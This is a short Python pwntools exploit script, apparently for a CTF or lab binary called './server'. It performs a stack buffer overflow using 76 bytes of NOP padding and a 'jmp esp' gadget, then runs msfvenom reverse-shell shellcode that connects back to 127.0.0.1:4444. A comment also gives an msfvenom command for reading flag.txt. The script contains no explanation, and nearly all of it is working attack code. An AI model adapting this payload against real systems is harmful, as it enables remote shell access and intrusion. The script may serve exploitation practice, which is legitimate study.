from pwn import *

exe = './server'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

io = process(exe)
padding = 76

jmp_esp = asm('jmp esp')
jmp_esp = next(elf.search(jmp_esp))

# commands
# msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f python
# msfvenom -p linux/x86/read_file FD=2 PATH=flag.txt -b '\x00' -f python


buf =  b""
buf += b"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0"
buf += b"\x66\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9"
buf += b"\x68\x7f\x00\x00\x01\x68\x02\x00\x11\x5c\x89\xe1"
buf += b"\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1\xcd\x80\x52"
buf += b"\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
buf += b"\x52\x53\x89\xe1\xb0\x0b\xcd\x80"

payload = flat(
        asm('nop')*padding,
        jmp_esp,
        asm('nop')*16,
        buf
        )

write('payload', payload)

io.sendlineafter(b':', payload)

io.interactive()
